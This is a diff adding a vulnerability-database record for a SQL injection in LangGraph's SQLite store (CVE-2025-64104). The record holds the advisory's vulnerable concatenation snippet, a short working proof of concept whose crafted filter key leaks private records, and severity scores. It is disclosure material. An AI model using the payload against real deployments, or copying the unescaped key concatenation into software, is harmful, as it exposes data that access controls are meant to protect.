@@ -1,0 +1,142 @@
+vulnerability_id: VCID-upzm-19hm-xfce
+aliases:
+  - CVE-2025-64104
+  - GHSA-7p73-8jqx-23r8
+summary: "LangGraph SQLite Checkpoint Filter Key SQL Injection POC for SqliteStore\n### Summary\n\
+  LangGraph's SQLite store implementation contains SQL injection vulnerabilities using direct\
+  \ string concatenation without proper parameterization, allowing attackers to inject arbitrary\
+  \ SQL and bypass access controls.\n\n### Details\n[`/langgraph/libs/checkpoint-sqlite/langgraph/store/sqlite/base.py`](https://github.com/langchain-ai/langgraph/blob/ee5d052a07aadd76dae123a27009ea0a3694fa0a/libs/checkpoint-sqlite/langgraph/store/sqlite/base.py#L407)\n\
+  \nThe key portion of the JSON path is concatenated directly into the SQL string without sanitation.\
+  \ There's a few different occurrences within the file.\n\n```python\n  filter_conditions.append(\n\
+  \      \"json_extract(value, '$.\"\n      + key  # <-- Directly concatenated, no escaping!\n\
+  \      + \"') = '\"\n      + value.replace(\"'\", \"''\")  # <-- Only value is escaped\n \
+  \     + \"'\"\n  )\n```\n\n### Who is affected\n\nThis issue affects **only developers or\
+  \ projects that directly use the `checkpoint-sqlite` store**. \n\nAn application is vulnerable\
+  \ only if it:\n1. Instantiates the `SqliteStore` from the `checkpoint-sqlite` package, **and**\n\
+  2. Builds the `filter` argument using keys derived from **untrusted or user-supplied input**\
+  \ (such as query parameters, request bodies, or other external data).\n\nIf filter keys are\
+  \ static or validated/allowlisted before being passed to the store, the risk does not apply.\n\
+  \nNote: users of LangSmith deployments (previously known as LangGraph Platform) are not affected\
+  \ as those deployments rely on a different checkpointer implementation.\n\n### PoC\n_Complete\
+  \ instructions, including specific configuration details, to reproduce the vulnerability._\n\
+  \n```python\n#!/usr/bin/env python3\n\"\"\"Minimal SQLite Key Injection POC for LangGraph\"\
+  \"\"\n\nfrom langgraph.store.sqlite import SqliteStore\n\n# Create store with test data\n\
+  with SqliteStore.from_conn_string(\":memory:\") as store:\n    store.setup()\n    \n    #\
+  \ Add public and private documents\n    store.put((\"docs\",), \"public\", {\"access\": \"\
+  public\", \"data\": \"public info\"})\n    store.put((\"docs\",), \"private\", {\"access\"\
+  : \"private\", \"data\": \"secret\", \"password\": \"123\"})\n    \n    # Normal query - returns\
+  \ 1 public document\n    normal = store.search((\"docs\",), filter={\"access\": \"public\"\
+  })\n    print(f\"Normal query: {len(normal)} docs\")\n    \n    # SQL injection via malicious\
+  \ key\n    malicious_key = \"access') = 'public' OR '1'='1' OR json_extract(value, '$.\"\n\
+  \    injected = store.search((\"docs\",), filter={malicious_key: \"dummy\"})\n    \n    print(f\"\
+  Injected query: {len(injected)} docs\")\n    for doc in injected:\n        if doc.value.get(\"\
+  access\") == \"private\":\n            print(f\"LEAKED: {doc.value}\")\n```"
+severities:
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12422'
+    published_at: '2025-10-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-64104
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12484'
+    published_at: '2025-11-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-64104
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.1253'
+    published_at: '2025-11-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-64104
+  - score: '0.00057'
+    scoring_system: epss
+    scoring_elements: '0.18044'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-64104
+  - score: '0.00057'
+    scoring_system: epss
+    scoring_elements: '0.18063'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-64104
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-7p73-8jqx-23r8
+  - score: '7.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N
+    published_at: None
+    url: https://github.com/langchain-ai/langgraph
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/langchain-ai/langgraph
+  - score: '7.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N
+    published_at: None
+    url: https://github.com/langchain-ai/langgraph/commit/bc9d45b476101e441cb1cc602dea03eb29232de4
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/langchain-ai/langgraph/commit/bc9d45b476101e441cb1cc602dea03eb29232de4
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-30T15:33:02Z/
+    published_at: None
+    url: https://github.com/langchain-ai/langgraph/commit/bc9d45b476101e441cb1cc602dea03eb29232de4
+  - score: '7.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N
+    published_at: None
+    url: https://github.com/langchain-ai/langgraph/security/advisories/GHSA-7p73-8jqx-23r8
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/langchain-ai/langgraph/security/advisories/GHSA-7p73-8jqx-23r8
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/langchain-ai/langgraph/security/advisories/GHSA-7p73-8jqx-23r8
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-30T15:33:02Z/
+    published_at: None
+    url: https://github.com/langchain-ai/langgraph/security/advisories/GHSA-7p73-8jqx-23r8
+  - score: '7.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-64104
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-64104
+weaknesses:
+  - CWE-89
+  - CWE-1035
+  - CWE-937
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-64104
+    reference_type:
+    reference_id:
+  - url: https://github.com/langchain-ai/langgraph
+    reference_type:
+    reference_id:
+  - url: https://github.com/langchain-ai/langgraph/commit/bc9d45b476101e441cb1cc602dea03eb29232de4
+    reference_type:
+    reference_id:
+  - url: https://github.com/langchain-ai/langgraph/security/advisories/GHSA-7p73-8jqx-23r8
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-64104
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-7p73-8jqx-23r8
+    reference_type:
+    reference_id: GHSA-7p73-8jqx-23r8
